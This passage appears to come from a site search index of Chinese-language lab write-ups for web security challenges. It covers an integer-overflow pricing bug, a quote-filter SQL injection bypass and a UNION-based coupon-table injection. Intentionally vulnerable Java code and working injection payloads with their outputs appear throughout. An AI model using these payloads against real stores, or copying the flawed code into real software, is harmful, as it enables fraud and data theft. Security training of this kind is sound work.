\u8f93\u5165\u6570\u636e\uff0c\u7981\u6b62\u8f93\u5165\u8d1f\u6570 private static int validateAmount (int amount) { if(amount < 0) amount = 0; return amount; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u7531\u4e8e\u6570\u91cf\u53ea\u80fd\u8f93\u5165\u6b63\u6570\uff0c\u5e76\u4e14\u603b\u548c\u8981\u5c0f\u4e8e0 \uff0c\u662f\u4e00\u4e2a\u6570\u636e\u6ea2\u51fa\u7684\u95ee\u9898 java int: 4byte = 32 bit \u6709\u7b26\u53f7signed\u8303\u56f4\uff1a2^31-1 ~ -2^31\u5373\uff1a2147483647 ~ -2147483648 \u6240\u4ee5\u5de8\u9b54\u8f93\u5165 21474836 \uff0c\u5728\u4e58\u4ee53000 \u8db3\u591f\u6ea2\u51fa \u603b\u7ed3 \u00b6 \u6821\u9a8c\u6570\u636e\u65f6\uff0c\u8981\u4e25\u683c\u9650\u5236\u8303\u56f4\uff0c\u6bd4\u598210~1000\uff0c\u8bbe\u7f6e\u4e0a\u9650\u548c\u4e0b\u9650","title":"Poor Validation Two(\u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1 2)"},{"location":"vul/Poor-Validation-Two.html#poor-validation-two-2","text":"","title":"Poor Validation Two(\u5931\u6548\u7684\u6570\u636e\u9a8c\u8bc1 2)"},{"location":"vul/Poor-Validation-Two.html#_1","text":"\u9700\u8981\u4e0d\u82b1\u94b1\u8d2d\u4e70\u5230\u7b2c\u4e09\u65b9\u5546\u54c1","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Poor-Validation-Two.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/20e8c4bb50180fed9c1c8d1bf6af5eac154e97d3ce97e43257c76e73e3bbe5d5 HTTP/1.1 megustaAmount=0&trollAmount=1&rageAmount=-100&notBadAmount=0 \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 int megustaAmount = validateAmount(Integer.parseInt(request.getParameter(\"megustaAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"megustaAmount - \" + megustaAmount); int trollAmount = validateAmount(Integer.parseInt(request.getParameter(\"trollAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"trollAmount - \" + trollAmount); int rageAmount = validateAmount(Integer.parseInt(request.getParameter(\"rageAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"rageAmount - \" + rageAmount); int notBadAmount = validateAmount(Integer.parseInt(request.getParameter(\"notBadAmount\"))); //\u5f3a\u5236\u8f6c\u4e49 \u4e3a\u5927\u4e8e0 log.debug(\"notBadAmount - \" + notBadAmount); //Working out costs int megustaCost = megustaAmount * 30; int trollCost = trollAmount * 3000; int rageCost = rageAmount * 45; int notBadCost = notBadAmount * 15; htmlOutput = new String(); //Work Out Final Cost int finalCost = megustaCost + rageCost + notBadCost + trollCost; //Output Order htmlOutput = \"<h3 class='title'>\" + bundle.getString(\"poorValidation.orderComplete\") + \"</h3>\" + \"<p>\" + bundle.getString(\"poorValidation.orderComplete.message\") + \"</p><br/>\" + \"<p>\" + bundle.getString(\"poorValidation.orderTotal\") + \" <a><strong>$\" + finalCost + \"</strong></a></p>\"; if (finalCost <= 0 && trollAmount > 0) //\u603b\u91d1\u989d\u5c0f\u4e8e\u7b49\u4e8e0\uff0c\u5de8\u9b54\u6570\u91cf\u5927\u4e8e0 { htmlOutput += \"<br><p>\" + bundle.getString(\"poorValidation.freeTrolls\") + \" - \" + Hash.generateUserSolution(levelSolution, currentUser) + \"</p>\"; } //\u9a8c\u8bc1\u4e86 \u8f93\u5165\u6570\u636e\uff0c\u7981\u6b62\u8f93\u5165\u8d1f\u6570 private static int validateAmount (int amount) { if(amount < 0) amount = 0; return amount; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Poor-Validation-Two.html#_3","text":"\u7531\u4e8e\u6570\u91cf\u53ea\u80fd\u8f93\u5165\u6b63\u6570\uff0c\u5e76\u4e14\u603b\u548c\u8981\u5c0f\u4e8e0 \uff0c\u662f\u4e00\u4e2a\u6570\u636e\u6ea2\u51fa\u7684\u95ee\u9898 java int: 4byte = 32 bit \u6709\u7b26\u53f7signed\u8303\u56f4\uff1a2^31-1 ~ -2^31\u5373\uff1a2147483647 ~ -2147483648 \u6240\u4ee5\u5de8\u9b54\u8f93\u5165 21474836 \uff0c\u5728\u4e58\u4ee53000 \u8db3\u591f\u6ea2\u51fa","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Poor-Validation-Two.html#_4","text":"\u6821\u9a8c\u6570\u636e\u65f6\uff0c\u8981\u4e25\u683c\u9650\u5236\u8303\u56f4\uff0c\u6bd4\u598210~1000\uff0c\u8bbe\u7f6e\u4e0a\u9650\u548c\u4e0b\u9650","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-4.html","text":"SQL Injection 4(SQL \u6ce8\u5165 4) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u8fc7SQL\u6ce8\u5165\u70b9\u83b7\u5f97administrator \u7684\u4fe1\u606f \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/1feccf2205b4c5ddf743630b46aece3784d61adc56498f7603ccd7cb8ae92629 HTTP/1.1 theUserName=admin&thePassword=password \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 String theUserName = request.getParameter(\"theUserName\"); log.debug(\"User Submitted - \" + theUserName); theUserName = SqlFilter.levelFour(theUserName); //\u8fdb\u884c\u4e86\u5b89\u5168\u8fc7\u6ee4 log.debug(\"Filtered to \" + theUserName); String thePassword = request.getParameter(\"thePassword\"); log.debug(\"thePassword Submitted - \" + thePassword); thePassword = SqlFilter.levelFour(thePassword); log.debug(\"Filtered to \" + thePassword); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeFour\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT userName FROM users WHERE userName = '\" + theUserName + \"' AND userPassword = '\" + thePassword + \"'\"); //\u7981\u6b62\u8f93\u5165\u5355\u5f15\u53f7 public static String SqlFilter.levelFour (String input) { input = input.toLowerCase(); while(input.contains(\"'\")) { log.debug(\"Scrubbing ' from input\"); input = input.replaceAll(\"'\", \"\"); } return input; } \u89e3\u9898\u6b65\u9aa4 \u00b6 SQL\u8bed\u53e5 \"SELECT userName FROM users WHERE userName = '\" + theUserName + \"' AND userPassword = '\" + thePassword + \"'\" \u4e24\u4e2a\u53d8\u91cf\u53ef\u63a7 \uff0c\u4f46\u4e0d\u5141\u8bb8\u8f93\u5165\u5355\u5f15\u53f7\uff0c\u9700\u8981\u5c06\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49 \u7528\u6237\u540d\u8f93\u5165 \u5bc6\u7801\u5b57\u6bb5 \u8f93\u5165 or 1=1 AND idusers = 7;-- \u4f46\u600e\u6837\u83b7\u5f97\u7684idusers = 7 \u4ecd\u7136\u662f\u4e2a\u8ff7... \u603b\u7ed3 \u00b6 \u4ee5\u524d\u4e00\u76f4\u8ba4\u4e3a\u8fc7\u6ee4\u6389 \u5355\u5f15\u53f7\u5c31\u4e07\u4e8b\u5927\u5409\u4e86\uff0c\u6ca1\u6709\u60f3\u5230\u8fd8\u662f\u4e0d\u8db3\u591f\u7684...","title":"SQL Injection 4(SQL \u6ce8\u5165 4)"},{"location":"vul/SQL-Injection-4.html#sql-injection-4sql-4","text":"","title":"SQL Injection 4(SQL \u6ce8\u5165 4)"},{"location":"vul/SQL-Injection-4.html#_1","text":"\u901a\u8fc7SQL\u6ce8\u5165\u70b9\u83b7\u5f97administrator \u7684\u4fe1\u606f","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-4.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/1feccf2205b4c5ddf743630b46aece3784d61adc56498f7603ccd7cb8ae92629 HTTP/1.1 theUserName=admin&thePassword=password \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 String theUserName = request.getParameter(\"theUserName\"); log.debug(\"User Submitted - \" + theUserName); theUserName = SqlFilter.levelFour(theUserName); //\u8fdb\u884c\u4e86\u5b89\u5168\u8fc7\u6ee4 log.debug(\"Filtered to \" + theUserName); String thePassword = request.getParameter(\"thePassword\"); log.debug(\"thePassword Submitted - \" + thePassword); thePassword = SqlFilter.levelFour(thePassword); log.debug(\"Filtered to \" + thePassword); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeFour\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT userName FROM users WHERE userName = '\" + theUserName + \"' AND userPassword = '\" + thePassword + \"'\"); //\u7981\u6b62\u8f93\u5165\u5355\u5f15\u53f7 public static String SqlFilter.levelFour (String input) { input = input.toLowerCase(); while(input.contains(\"'\")) { log.debug(\"Scrubbing ' from input\"); input = input.replaceAll(\"'\", \"\"); } return input; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-4.html#_3","text":"SQL\u8bed\u53e5 \"SELECT userName FROM users WHERE userName = '\" + theUserName + \"' AND userPassword = '\" + thePassword + \"'\" \u4e24\u4e2a\u53d8\u91cf\u53ef\u63a7 \uff0c\u4f46\u4e0d\u5141\u8bb8\u8f93\u5165\u5355\u5f15\u53f7\uff0c\u9700\u8981\u5c06\u5355\u5f15\u53f7\u8fdb\u884c\u8f6c\u4e49 \u7528\u6237\u540d\u8f93\u5165 \u5bc6\u7801\u5b57\u6bb5 \u8f93\u5165 or 1=1 AND idusers = 7;-- \u4f46\u600e\u6837\u83b7\u5f97\u7684idusers = 7 \u4ecd\u7136\u662f\u4e2a\u8ff7...","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-4.html#_4","text":"\u4ee5\u524d\u4e00\u76f4\u8ba4\u4e3a\u8fc7\u6ee4\u6389 \u5355\u5f15\u53f7\u5c31\u4e07\u4e8b\u5927\u5409\u4e86\uff0c\u6ca1\u6709\u60f3\u5230\u8fd8\u662f\u4e0d\u8db3\u591f\u7684...","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Challenge-5.html","text":"SQL Injection Challenge 5(SQL \u6ce8\u5165 5) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u514d\u8d39\u8d2d\u4e70\u7b2c\u4e09\u4e2a\u5546\u54c1\uff0c\u63d0\u793a\u662f\u4f18\u60e0\u5238\u6709\u95ee\u9898 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u65f6\u9996\u5148\u53d1\u9001 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck HTTP/1.1 couponCode=5 \u5b58\u5728\u4e00\u4e2aSQL\u6ce8\u5165 String couponCode = request.getParameter(\"couponCode\"); //\u63a5\u6536\u53c2\u6570 log.debug(\"couponCode - \" + couponCode); if (couponCode == null || couponCode.isEmpty()) couponCode = new String(); htmlOutput = new String(\"\"); Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlInjectionChallenge5ShopCoupon\"); log.debug(\"Looking for Coupons Insecurely\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT itemId, perCentOff, itemName FROM coupons JOIN items USING (itemId) WHERE couponCode = '\" + couponCode + \"';\"); // \u83b7\u5f97\u54ea\u4e2a\u5546\u54c1 \u591a\u5c11\u964d\u4ef7\u4fe1\u606f ResultSet coupons = prepstmt.executeQuery(); try { if(coupons.next()) { htmlOutput = new String(\"Valid Coupon for \"); log.debug(\"Found coupon for %\" + coupons.getInt(2)); log.debug(\"For Item Name \" + coupons.getString(3)); htmlOutput += \"\" + bundle.getString(\"response.percent\")+ \"\" + coupons.getInt(2) + \" \" + bundle.getString(\"response.off\")+ \" \" + Encode.forHtml(coupons.getString(3)) + \" \" + bundle.getString(\"response.items\")+ \"\"; } else { htmlOutput = \"\" + bundle.getString(\"response.noCoupon\")+ \"\"; } } \u63d0\u4ea4\u53c2\u6570 couponCode=5' or '1'='1 \u8fd4\u56de\u5185\u5bb9 Troll \u5c0610% Valid Coupon for %10 off Troll items \u8d2d\u4e70\u5546\u54c1\u8bf7\u6c42 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62 HTTP/1.1 megustaAmount=4&trollAmount=3&rageAmount=1&notBadAmount=2&couponCode=5 \u5bf9\u5e94\u4ee3\u7801 try { int megustaAmount = validateAmount(Integer.parseInt(request.getParameter(\"megustaAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"megustaAmount - \" + megustaAmount); int trollAmount = validateAmount(Integer.parseInt(request.getParameter(\"trollAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"trollAmount - \" + trollAmount); int rageAmount = validateAmount(Integer.parseInt(request.getParameter(\"rageAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"rageAmount - \" + rageAmount); int notBadAmount = validateAmount(Integer.parseInt(request.getParameter(\"notBadAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"notBadAmount - \" + notBadAmount); String couponCode = request.getParameter(\"couponCode\"); log.debug(\"couponCode - \" + couponCode); //Working out costs int megustaCost = megustaAmount * 30; int trollCost = trollAmount * 3000; int rageCost = rageAmount * 45; int notBadCost = notBadAmount * 15; int perCentOffMegusta = 0; // Will search for coupons in DB and update this int int perCentOffTroll = 0; // Will search for coupons in DB and update this int int perCentOffRage = 0; // Will search for coupons in DB and update this int int perCentOffNotBad = 0; // Will search for coupons in DB and update this int htmlOutput = new String(); Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlInjectionChallenge5Shop\"); log.debug(\"Looking for Coupons\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT itemId, perCentOff FROM coupons WHERE couponCode = ?\" + \"UNION SELECT itemId, perCentOff FROM vipCoupons WHERE couponCode = ?\"); //\u67e5\u8be2\u4f18\u60e0\u7801 prepstmt.setString(1, couponCode); prepstmt.setString(2, couponCode); ResultSet coupons = prepstmt.executeQuery(); try { if(coupons.next()) { if(coupons.getInt(1) == 1) // MeGusta { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off MeGusta\"); perCentOffMegusta = coupons.getInt(2); } else if (coupons.getInt(1) == 2) // Troll { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off Troll\"); perCentOffTroll = coupons.getInt(2); } else if (coupons.getInt(1) == 3) // Rage { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off Rage\"); perCentOffRage = coupons.getInt(2); } else if (coupons.getInt(1) == 4) // NotBad { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off NotBad\"); perCentOffNotBad = coupons.getInt(2); } } } catch(Exception e) { log.debug(\"Could Not Find Coupon: \" + e.toString()); } conn.close(); //Work Out Final Cost megustaCost = megustaCost - (megustaCost * (perCentOffMegusta/100)); rageCost = rageCost - (rageCost * (perCentOffRage/100)); notBadCost = notBadCost - (notBadCost * (perCentOffNotBad/100)); trollCost = trollCost - (trollCost * (perCentOffTroll/100)); //\u7ed3\u679c\u4e3a 0 \u5373\u53ef int finalCost = megustaCost + rageCost + notBadCost + trollCost; //Output Order htmlOutput = \"<h3>\" + bundle.getString(\"response.orderComplete\")+ \"</h3>\" + \"\" + bundle.getString(\"response.orderComplete.p1\")+ \"<br/><br/>\" + \"\" + bundle.getString(\"response.orderComplete.p2\")+ \"<a><strong>$\" + finalCost + \"</strong></a>\"; if (trollAmount > 0 && trollCost == 0) { htmlOutput += \"<br><br>\" + bundle.getString(\"response.trollsFreeSolution\")+ \"<a><b>\" + Encode.forHtml(levelSolution) + \"</b></a>\"; } } catch(Exception e) { log.debug(\"Didn't complete order: \" + e.toString()); htmlOutput += \"<p>\" + bundle.getString(\"response.orderFailed\")+ \"</p>\"; } private static int validateAmount (int amount) { if(amount < 0 || amount > 9000) amount = 0; return amount; } \u4ece\u9898\u53ef\u4ee5\u770b\u51fa\uff0c\u8981\u4fdd\u8bc1 \u5de8\u9b54 \u5546\u54c1\u7684\u6700\u7ec8\u4ef7\u683c\u4e3a 0 \u5373\u53ef perCentOffTroll \u6765\u6e90\u4e8esql\u67e5\u8be2\u7ed3\u679c \uff0c\u9700\u8981\u83b7\u5f97\u5bf9\u5e94\u7684\u5546\u54c1\u4fe1\u606f \u89e3\u9898\u6b65\u9aa4 \u00b6 \u53d1\u73b0 \u8fd9\u4e2a\u6ce8\u5165\u70b9 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 110 couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', itemId, ' ') from coupons; -- \u8fd4\u56de\u5185\u5bb9 Valid Coupon for %100 off This is the couponCode: 3 items itemId = 3 \u5bf9\u5de8\u9b54\u5546\u54c1\u8ba1\u7b97\u6ca1\u6709\u5f71\u54cd //\u53d1\u9001\u8bf7\u6c42 couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from coupons where itemId=2; -- //\u83b7\u5f97\u8fd4\u56de\u5185\u5bb9 Valid Coupon for %10 off This is the couponCode: PleaseTakeATroll items //\u8fd4\u4f63\u6bd4\u8f83\u5c11 \u65e0\u6cd5\u8fbe\u5230\u9884\u671f //\u53d1\u9001\u8bf7\u6c42 couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from coupons where itemId=2 and percentOff != 10; -- //\u83b7\u5f97\u8fd4\u56de\u5185\u5bb9 Valid Coupon for %50 off This is the couponCode: HalfOffTroll items \u6700\u9ad8\u8fd4\u4f63\u662f50% \u65e0\u6cd5\u8fbe\u5230\u9884\u671f \u67e5\u770b\u63d0\u793a \u53d1\u73b0\u9700\u8981\u7814\u7a76 \u8fd9\u4e2ajs challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62/couponCheck.js \u7b2c\u4e00\u884c\u89e3\u5bc6 var _0xffee = [\"change\", \"val\", \"#couponCode\", \"POST\", \"8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck\", \"ajax\", \"8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck\", \"#vipCouponCode\"]; $(_0xffee[7])[_0xffee[0]](function() { var _0xe83dx1 = $(_0xffee[2])[_0xffee[1]](); var _0xe83dx2 = $[_0xffee[5]]({ type: _0xffee[3], url: _0xffee[6], data: { couponCode: _0xe83dx1 }, async: false }); })[_0xffee[0]](); \u53ef\u77e5\u8fd8\u6709\u4e2a\u8bf7\u6c42\u5730\u5740 _0xffee[6]( 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck) \u8fd9\u4e2a\u5730\u5740 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck \u4e0e 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck \u53c2\u6570\u76f8\u540c \u540c\u6837\u5b58\u5728\u6ce8\u5165 \u8bf7\u6c42 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck HTTP/1.1 couponCode=6' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from vipCoupons where itemId=2; -- \u83b7\u5f97\u8fd4\u56de Valid Coupon for %100 off This is the couponCode: spcil/|Pse3cr3etCouponStu.f4rU176 items couponCode \u4e3a spcil/|Pse3cr3etCouponStu.f4rU176 \uff0c\u4f18\u60e0100% \u603b\u7ed3 \u00b6 \u590d\u6742\u7684\u4e1a\u52a1\u6d41\u7a0b\uff0c\u5f88\u5bb9\u6613\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\uff0c\u9700\u8981\u6bcf\u4e2a\u70b9\u90fd\u505a\u7684\u5f88\u597d\u624d\u53ef\u4ee5","title":"SQL Injection Challenge 5(SQL \u6ce8\u5165 5)"},{"location":"vul/SQL-Injection-Challenge-5.html#sql-injection-challenge-5sql-5","text":"","title":"SQL Injection Challenge 5(SQL \u6ce8\u5165 5)"},{"location":"vul/SQL-Injection-Challenge-5.html#_1","text":"\u9700\u8981\u514d\u8d39\u8d2d\u4e70\u7b2c\u4e09\u4e2a\u5546\u54c1\uff0c\u63d0\u793a\u662f\u4f18\u60e0\u5238\u6709\u95ee\u9898","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Challenge-5.html#_2","text":"\u8bf7\u6c42\u65f6\u9996\u5148\u53d1\u9001 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck HTTP/1.1 couponCode=5 \u5b58\u5728\u4e00\u4e2aSQL\u6ce8\u5165 String couponCode = request.getParameter(\"couponCode\"); //\u63a5\u6536\u53c2\u6570 log.debug(\"couponCode - \" + couponCode); if (couponCode == null || couponCode.isEmpty()) couponCode = new String(); htmlOutput = new String(\"\"); Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlInjectionChallenge5ShopCoupon\"); log.debug(\"Looking for Coupons Insecurely\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT itemId, perCentOff, itemName FROM coupons JOIN items USING (itemId) WHERE couponCode = '\" + couponCode + \"';\"); // \u83b7\u5f97\u54ea\u4e2a\u5546\u54c1 \u591a\u5c11\u964d\u4ef7\u4fe1\u606f ResultSet coupons = prepstmt.executeQuery(); try { if(coupons.next()) { htmlOutput = new String(\"Valid Coupon for \"); log.debug(\"Found coupon for %\" + coupons.getInt(2)); log.debug(\"For Item Name \" + coupons.getString(3)); htmlOutput += \"\" + bundle.getString(\"response.percent\")+ \"\" + coupons.getInt(2) + \" \" + bundle.getString(\"response.off\")+ \" \" + Encode.forHtml(coupons.getString(3)) + \" \" + bundle.getString(\"response.items\")+ \"\"; } else { htmlOutput = \"\" + bundle.getString(\"response.noCoupon\")+ \"\"; } } \u63d0\u4ea4\u53c2\u6570 couponCode=5' or '1'='1 \u8fd4\u56de\u5185\u5bb9 Troll \u5c0610% Valid Coupon for %10 off Troll items \u8d2d\u4e70\u5546\u54c1\u8bf7\u6c42 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62 HTTP/1.1 megustaAmount=4&trollAmount=3&rageAmount=1&notBadAmount=2&couponCode=5 \u5bf9\u5e94\u4ee3\u7801 try { int megustaAmount = validateAmount(Integer.parseInt(request.getParameter(\"megustaAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"megustaAmount - \" + megustaAmount); int trollAmount = validateAmount(Integer.parseInt(request.getParameter(\"trollAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"trollAmount - \" + trollAmount); int rageAmount = validateAmount(Integer.parseInt(request.getParameter(\"rageAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"rageAmount - \" + rageAmount); int notBadAmount = validateAmount(Integer.parseInt(request.getParameter(\"notBadAmount\"))); //\u53c2\u6570\u8fc7\u6ee4 0~9000 log.debug(\"notBadAmount - \" + notBadAmount); String couponCode = request.getParameter(\"couponCode\"); log.debug(\"couponCode - \" + couponCode); //Working out costs int megustaCost = megustaAmount * 30; int trollCost = trollAmount * 3000; int rageCost = rageAmount * 45; int notBadCost = notBadAmount * 15; int perCentOffMegusta = 0; // Will search for coupons in DB and update this int int perCentOffTroll = 0; // Will search for coupons in DB and update this int int perCentOffRage = 0; // Will search for coupons in DB and update this int int perCentOffNotBad = 0; // Will search for coupons in DB and update this int htmlOutput = new String(); Connection conn = Database.getChallengeConnection(applicationRoot, \"SqlInjectionChallenge5Shop\"); log.debug(\"Looking for Coupons\"); PreparedStatement prepstmt = conn.prepareStatement(\"SELECT itemId, perCentOff FROM coupons WHERE couponCode = ?\" + \"UNION SELECT itemId, perCentOff FROM vipCoupons WHERE couponCode = ?\"); //\u67e5\u8be2\u4f18\u60e0\u7801 prepstmt.setString(1, couponCode); prepstmt.setString(2, couponCode); ResultSet coupons = prepstmt.executeQuery(); try { if(coupons.next()) { if(coupons.getInt(1) == 1) // MeGusta { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off MeGusta\"); perCentOffMegusta = coupons.getInt(2); } else if (coupons.getInt(1) == 2) // Troll { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off Troll\"); perCentOffTroll = coupons.getInt(2); } else if (coupons.getInt(1) == 3) // Rage { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off Rage\"); perCentOffRage = coupons.getInt(2); } else if (coupons.getInt(1) == 4) // NotBad { log.debug(\"Found coupon for %\" + coupons.getInt(2) + \" off NotBad\"); perCentOffNotBad = coupons.getInt(2); } } } catch(Exception e) { log.debug(\"Could Not Find Coupon: \" + e.toString()); } conn.close(); //Work Out Final Cost megustaCost = megustaCost - (megustaCost * (perCentOffMegusta/100)); rageCost = rageCost - (rageCost * (perCentOffRage/100)); notBadCost = notBadCost - (notBadCost * (perCentOffNotBad/100)); trollCost = trollCost - (trollCost * (perCentOffTroll/100)); //\u7ed3\u679c\u4e3a 0 \u5373\u53ef int finalCost = megustaCost + rageCost + notBadCost + trollCost; //Output Order htmlOutput = \"<h3>\" + bundle.getString(\"response.orderComplete\")+ \"</h3>\" + \"\" + bundle.getString(\"response.orderComplete.p1\")+ \"<br/><br/>\" + \"\" + bundle.getString(\"response.orderComplete.p2\")+ \"<a><strong>$\" + finalCost + \"</strong></a>\"; if (trollAmount > 0 && trollCost == 0) { htmlOutput += \"<br><br>\" + bundle.getString(\"response.trollsFreeSolution\")+ \"<a><b>\" + Encode.forHtml(levelSolution) + \"</b></a>\"; } } catch(Exception e) { log.debug(\"Didn't complete order: \" + e.toString()); htmlOutput += \"<p>\" + bundle.getString(\"response.orderFailed\")+ \"</p>\"; } private static int validateAmount (int amount) { if(amount < 0 || amount > 9000) amount = 0; return amount; } \u4ece\u9898\u53ef\u4ee5\u770b\u51fa\uff0c\u8981\u4fdd\u8bc1 \u5de8\u9b54 \u5546\u54c1\u7684\u6700\u7ec8\u4ef7\u683c\u4e3a 0 \u5373\u53ef perCentOffTroll \u6765\u6e90\u4e8esql\u67e5\u8be2\u7ed3\u679c \uff0c\u9700\u8981\u83b7\u5f97\u5bf9\u5e94\u7684\u5546\u54c1\u4fe1\u606f","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Challenge-5.html#_3","text":"\u53d1\u73b0 \u8fd9\u4e2a\u6ce8\u5165\u70b9 POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 110 couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', itemId, ' ') from coupons; -- \u8fd4\u56de\u5185\u5bb9 Valid Coupon for %100 off This is the couponCode: 3 items itemId = 3 \u5bf9\u5de8\u9b54\u5546\u54c1\u8ba1\u7b97\u6ca1\u6709\u5f71\u54cd //\u53d1\u9001\u8bf7\u6c42 couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from coupons where itemId=2; -- //\u83b7\u5f97\u8fd4\u56de\u5185\u5bb9 Valid Coupon for %10 off This is the couponCode: PleaseTakeATroll items //\u8fd4\u4f63\u6bd4\u8f83\u5c11 \u65e0\u6cd5\u8fbe\u5230\u9884\u671f //\u53d1\u9001\u8bf7\u6c42 couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from coupons where itemId=2 and percentOff != 10; -- //\u83b7\u5f97\u8fd4\u56de\u5185\u5bb9 Valid Coupon for %50 off This is the couponCode: HalfOffTroll items \u6700\u9ad8\u8fd4\u4f63\u662f50% \u65e0\u6cd5\u8fbe\u5230\u9884\u671f \u67e5\u770b\u63d0\u793a \u53d1\u73b0\u9700\u8981\u7814\u7a76 \u8fd9\u4e2ajs challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62/couponCheck.js \u7b2c\u4e00\u884c\u89e3\u5bc6 var _0xffee = [\"change\", \"val\", \"#couponCode\", \"POST\", \"8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck\", \"ajax\", 